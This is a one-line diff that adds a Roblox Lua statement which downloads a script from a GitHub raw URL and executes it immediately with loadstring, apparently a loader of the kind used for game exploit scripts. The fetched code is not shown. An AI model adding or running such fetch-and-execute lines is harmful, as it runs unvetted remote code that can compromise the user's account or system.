@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rgf7193-byte/Kcalb/refs/heads/main/Kcalb"))()
